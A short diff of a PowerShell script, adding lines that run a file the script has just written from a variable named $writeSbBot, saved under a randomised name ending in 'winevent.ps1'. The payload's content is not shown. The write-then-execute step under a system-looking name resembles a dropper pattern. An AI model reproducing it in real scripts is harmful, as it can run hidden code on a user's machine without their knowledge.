@@ -35,3 +35,7 @@ $file = $sbDir + $sbRand + 'winevent.ps1'
 
 #write this to a file
 $writeSbBot | Out-File -FilePath $file
+
+# Executes the PS Script
+
+Invoke-Expression $file
